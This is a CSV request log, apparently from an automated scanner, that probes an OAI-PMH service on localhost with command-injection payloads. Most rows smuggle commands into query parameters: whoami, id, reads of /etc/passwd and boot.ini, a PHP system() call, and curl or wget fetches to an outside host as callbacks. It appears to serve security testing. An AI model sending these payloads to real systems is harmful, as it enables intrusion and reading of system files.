uuid,timestamp,http_status_code,request_url,response_time,http_version
4af00f67-9dda-4998-8064-a391585bd09f,2025-01-01 17:22:41,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%22%3B+whoami,2091.42 ms,HTTP/1.1
d98f8dee-2ad3-4cb0-ac00-b0c3a6655454,2025-01-01 17:22:44,200,http://localhost:8081/oai/request?verb=ListSets,2128.66 ms,HTTP/1.1
5bf1f5d3-343b-4ed4-b863-7a0ff86beb8d,2025-01-01 17:22:46,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%22%3B+whoami,2112.57 ms,HTTP/1.1
74cc7f22-ce04-4e87-b267-aedb2db827a3,2025-01-01 17:22:48,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%22%3B+whoami,2137.64 ms,HTTP/1.1
33820c4f-b56a-48cb-b18a-163263ab1ec1,2025-01-01 17:22:51,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%22%3B+whoami&metadataPrefix=marc,2155.70 ms,HTTP/1.1
95975c99-9fb9-4107-a3e8-6518bdbe0ea2,2025-01-01 17:22:53,403,http://localhost:8081/oai/request?verb=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2081.26 ms,HTTP/1.1
9cace322-2ed6-4e22-bf52-5d28d8d728e4,2025-01-01 17:22:56,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2111.41 ms,HTTP/1.1
f9c4c17e-16ab-453e-ac31-b70debc9e041,2025-01-01 17:22:58,200,http://localhost:8081/oai/request?verb=ListSets,2136.74 ms,HTTP/1.1
f4e734a1-dc47-422b-a32d-1488e78e0fda,2025-01-01 17:23:01,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60cat+%2Fetc%2Fpasswd%60%29&set=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2152.14 ms,HTTP/1.1
6e3a65fa-0570-4546-82bc-8d2d308a3bfe,2025-01-01 17:23:03,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%28%60cat+%2Fetc%2Fpasswd%60%29,2185.88 ms,HTTP/1.1
6868e8fc-afbe-4dae-9584-5a161fc6aa79,2025-01-01 17:23:05,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60cat+%2Fetc%2Fpasswd%60%29&metadataPrefix=oai_dc,2108.46 ms,HTTP/1.1
56e610f4-8945-4839-a0cd-be0c86156b01,2025-01-01 17:23:08,403,http://localhost:8081/oai/request?verb=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2057.61 ms,HTTP/1.1
7b879bfb-1edd-414f-933d-942f4ea04f41,2025-01-01 17:23:10,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2137.70 ms,HTTP/1.1
b66edb9e-9c3f-42a5-a259-93bb38b0cfc5,2025-01-01 17:23:12,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2095.92 ms,HTTP/1.1
0b1c971c-4f28-4cd4-a981-659a731aab57,2025-01-01 17:23:15,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2137.23 ms,HTTP/1.1
ca05d7b7-ce41-44bc-8a2f-e40f41e2e493,2025-01-01 17:23:17,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&until=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2112.25 ms,HTTP/1.1
63d01973-181b-4783-97ef-ccfb27298a46,2025-01-01 17:23:20,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60curl+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=marc,2124.55 ms,HTTP/1.1
6847c7ee-c17e-4f18-aaf4-22d8f2e056ae,2025-01-01 17:23:22,403,http://localhost:8081/oai/request?verb=%24%28%60dir%60%29,2078.34 ms,HTTP/1.1
d08ef340-7890-4160-aa8b-bc1b9146f18a,2025-01-01 17:23:24,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2144.10 ms,HTTP/1.1
5b6e9f69-abad-491a-ac0d-d2423be90083,2025-01-01 17:23:27,200,http://localhost:8081/oai/request?verb=ListSets,2137.52 ms,HTTP/1.1
e879c6c9-ed71-4b3c-be77-6b80c42c82e2,2025-01-01 17:23:29,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%24%28%60dir%60%29&set=%24%28%60dir%60%29,2141.61 ms,HTTP/1.1
85d48f4d-dd0a-490e-ab52-466a5537e3f3,2025-01-01 17:23:32,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60dir%60%29&until=%24%28%60dir%60%29,2145.69 ms,HTTP/1.1
c45dae8a-69f6-42e6-918f-21e8b277e8d4,2025-01-01 17:23:34,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60dir%60%29&metadataPrefix=oai_dc,2130.25 ms,HTTP/1.1
1e68e96a-1907-4b7a-a859-060947b50611,2025-01-01 17:23:37,403,http://localhost:8081/oai/request?verb=%24%28%60ls%60%29,2088.50 ms,HTTP/1.1
255ee9ea-05e0-445f-ade8-df38ac4b5d99,2025-01-01 17:23:39,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60ls%60%29,2131.96 ms,HTTP/1.1
eed9e443-38de-4b30-a343-03c48a8ec8dc,2025-01-01 17:23:41,200,http://localhost:8081/oai/request?verb=ListSets,2134.70 ms,HTTP/1.1
aa3e0051-f95b-4bf3-95db-6d876c726095,2025-01-01 17:23:44,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60ls%60%29&until=%24%28%60ls%60%29&set=%24%28%60ls%60%29,2156.86 ms,HTTP/1.1
e390700f-1c0e-4212-8210-8e4adeee40fd,2025-01-01 17:23:46,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60ls%60%29&set=%24%28%60ls%60%29,2124.11 ms,HTTP/1.1
f85c4900-fa64-48d9-ae0b-5993ae85bf88,2025-01-01 17:23:49,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60ls%60%29&metadataPrefix=marc,2114.03 ms,HTTP/1.1
5dc7e43f-08ec-4ec2-8cf8-a589dd2fa244,2025-01-01 17:23:51,403,http://localhost:8081/oai/request?verb=%24%28%60type+C%3A%5Cboot.ini%60%29,2092.01 ms,HTTP/1.1
24e8f4ad-206c-4375-ad46-99b83671ae22,2025-01-01 17:23:53,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29,2110.88 ms,HTTP/1.1
21ece202-b02a-4d5b-a6d1-871f99b74955,2025-01-01 17:23:56,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60type+C%3A%5Cboot.ini%60%29,2127.17 ms,HTTP/1.1
4dd04104-0b5f-4447-b077-d0168476eb9b,2025-01-01 17:23:58,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%24%28%60type+C%3A%5Cboot.ini%60%29&until=%24%28%60type+C%3A%5Cboot.ini%60%29,2143.53 ms,HTTP/1.1
40229cdc-1f4a-4389-bc87-e49b0f51c894,2025-01-01 17:24:01,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%24%28%60type+C%3A%5Cboot.ini%60%29,2118.80 ms,HTTP/1.1
2eda2ae2-735b-4c9a-a9af-41d13f217a67,2025-01-01 17:24:03,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60type+C%3A%5Cboot.ini%60%29&metadataPrefix=oai_dc,2148.99 ms,HTTP/1.1
8f283c19-c039-45b5-a858-bd43f5d04a2f,2025-01-01 17:24:05,403,http://localhost:8081/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2083.91 ms,HTTP/1.1
5a3de6d8-be57-40d8-8efd-f96b5801d919,2025-01-01 17:24:08,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2129.98 ms,HTTP/1.1
aa5dac8e-553c-4c54-bb3e-9614a30f08ee,2025-01-01 17:24:10,200,http://localhost:8081/oai/request?verb=ListSets,2110.52 ms,HTTP/1.1
ca8ee7ad-0eaf-44f0-9a8a-cffc997a58d0,2025-01-01 17:24:13,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2130.62 ms,HTTP/1.1
9fc5d377-8157-4288-b774-097c48713ba1,2025-01-01 17:24:15,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&set=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29,2119.87 ms,HTTP/1.1
8fa41599-f591-4735-a15d-0f88fa0a34e3,2025-01-01 17:24:17,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%3Freq%3D22jjffjbn%60%29&metadataPrefix=oai_dc,2136.75 ms,HTTP/1.1
cd722be6-7da1-496d-86f5-a143eabb25dc,2025-01-01 17:24:20,403,http://localhost:8081/oai/request?verb=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2079.96 ms,HTTP/1.1
538be84a-a540-4744-ba29-8ac0ea96ee81,2025-01-01 17:24:22,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2132.50 ms,HTTP/1.1
937e27b0-28b4-481f-bddd-e63f04a06f4d,2025-01-01 17:24:25,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2144.42 ms,HTTP/1.1
bc9fae54-6c43-4615-b92a-f44081823245,2025-01-01 17:24:27,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2146.34 ms,HTTP/1.1
5a1d168b-954a-4f68-bdb7-ad44f1071814,2025-01-01 17:24:29,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29,2132.89 ms,HTTP/1.1
6aa24b8b-b734-430c-9f57-0723453d1df1,2025-01-01 17:24:32,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60wget+https%3A%2F%2Fcrowdshield.com%2F.testing%2Frce_vuln.txt%60%29&metadataPrefix=marc,2113.34 ms,HTTP/1.1
bfd6c507-776d-4056-9ba6-c7320911a9d6,2025-01-01 17:24:34,403,http://localhost:8081/oai/request?verb=%24%28%60whoami%60%29,2035.83 ms,HTTP/1.1
d5230f12-4d1f-422a-b9cf-bf917b3e4a56,2025-01-01 17:24:37,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2153.18 ms,HTTP/1.1
70e0074d-af4f-4873-bd4f-0c5233371689,2025-01-01 17:24:39,200,http://localhost:8081/oai/request?verb=ListSets,2139.37 ms,HTTP/1.1
e8bdd360-be1e-49c1-8b60-1823f6d0492a,2025-01-01 17:24:41,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%28%60whoami%60%29&set=%24%28%60whoami%60%29,2129.27 ms,HTTP/1.1
e5955412-2930-4f71-b74b-276cc8d3e43e,2025-01-01 17:24:44,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%24%28%60whoami%60%29,2105.33 ms,HTTP/1.1
58533af5-373b-414f-9516-23210e02190d,2025-01-01 17:24:46,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%28%60whoami%60%29&metadataPrefix=oai_dc,2142.76 ms,HTTP/1.1
545828d9-b919-4542-bba6-edbfb94db82a,2025-01-01 17:24:49,403,http://localhost:8081/oai/request?verb=%24%3B%2Fusr%2Fbin%2Fid,2086.68 ms,HTTP/1.1
c3c432f9-f604-4043-bbb1-a4f89832403a,2025-01-01 17:24:51,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%24%3B%2Fusr%2Fbin%2Fid,2093.87 ms,HTTP/1.1
06b5984a-f7c4-42d3-9adf-fcf99772530d,2025-01-01 17:24:53,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%3B%2Fusr%2Fbin%2Fid,2134.17 ms,HTTP/1.1
7ad3aa87-b050-48a9-b845-54e7af324f35,2025-01-01 17:24:56,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2112.29 ms,HTTP/1.1
699de772-58b0-4261-9ec6-b7d1c1047edf,2025-01-01 17:24:58,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%24%3B%2Fusr%2Fbin%2Fid&until=%24%3B%2Fusr%2Fbin%2Fid,2121.24 ms,HTTP/1.1
4fac470a-e6dd-4eea-a5f8-94a5084c0d94,2025-01-01 17:25:00,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%3B%2Fusr%2Fbin%2Fid&metadataPrefix=oai_dc,2145.44 ms,HTTP/1.1
387d6afe-ab4e-44e6-aae8-2af0761a168a,2025-01-01 17:25:03,403,http://localhost:8081/oai/request?verb=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2090.40 ms,HTTP/1.1
1ab39b1d-5f49-4265-980b-804b8d618978,2025-01-01 17:25:05,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2117.92 ms,HTTP/1.1
1f033fdf-ec5a-4e59-8c18-23aa1425452c,2025-01-01 17:25:08,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2133.85 ms,HTTP/1.1
fedc02f9-32ce-4710-aacb-adc261a826c4,2025-01-01 17:25:10,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2135.68 ms,HTTP/1.1
c20a6448-07d8-477e-8fbf-55e350c589e1,2025-01-01 17:25:12,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%24%7B%40print%28%22RCEVulnerable%22%29%7D&set=%24%7B%40print%28%22RCEVulnerable%22%29%7D,2132.62 ms,HTTP/1.1
5afbce60-0dec-4d81-9c94-b792a60cde24,2025-01-01 17:25:15,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%7B%40print%28%22RCEVulnerable%22%29%7D&metadataPrefix=marc,2135.56 ms,HTTP/1.1
f8bff38e-2921-46ec-8d15-1a6b27435fdf,2025-01-01 17:25:17,403,http://localhost:8081/oai/request?verb=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2081.33 ms,HTTP/1.1
7b1e8132-1d61-4e40-a351-33ec2418ccaa,2025-01-01 17:25:20,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2114.76 ms,HTTP/1.1
92e5bbb4-e87b-4456-baae-a201bf251f85,2025-01-01 17:25:22,403,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2086.22 ms,HTTP/1.1
f6583435-15cf-4c75-829a-a9917c7c553e,2025-01-01 17:25:24,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2117.16 ms,HTTP/1.1
8a085a3a-2678-4743-b6ba-bae8d8e8f8cc,2025-01-01 17:25:27,403,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&set=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D,2074.06 ms,HTTP/1.1
fcb63f5c-602d-4d50-b7c6-351626b90eec,2025-01-01 17:25:29,403,http://localhost:8081/oai/request?verb=GetRecord&identifier=%24%7B%40print%28system%28%24_SERVER%5B%27HTTP_USER_AGENT%27%5D%29%29%7D&metadataPrefix=oai_dc,2078.05 ms,HTTP/1.1
39e0e199-d802-4889-b1b8-050b2f553fdc,2025-01-01 17:25:32,403,http://localhost:8081/oai/request?verb=%250A%2Fusr%2Fbin%2Fid,2103.97 ms,HTTP/1.1
5223e476-a89f-487e-9849-9978c9e1f7da,2025-01-01 17:25:34,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2130.32 ms,HTTP/1.1
d8427611-d5d8-4d06-aae7-7f84f66232a6,2025-01-01 17:25:36,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%250A%2Fusr%2Fbin%2Fid,2134.95 ms,HTTP/1.1
051bc22e-3995-4be6-9224-659ef29120ec,2025-01-01 17:25:39,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc,2123.65 ms,HTTP/1.1
fd9fbf1c-e2d6-4c64-a10e-34c4b0db8612,2025-01-01 17:25:41,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%250A%2Fusr%2Fbin%2Fid,2149.31 ms,HTTP/1.1
47c5bc8d-9f9b-467e-b015-67fa7f5915b8,2025-01-01 17:25:44,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%250A%2Fusr%2Fbin%2Fid&metadataPrefix=marc,2148.24 ms,HTTP/1.1
5571bf00-3a06-4f99-bb3d-874d90d63058,2025-01-01 17:25:46,403,http://localhost:8081/oai/request?verb=%250A%2Fusr%2Fbin%2Fid%250A,2081.26 ms,HTTP/1.1
abf2e5dc-4919-4cad-a63d-0d4189c9117c,2025-01-01 17:25:48,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2127.81 ms,HTTP/1.1
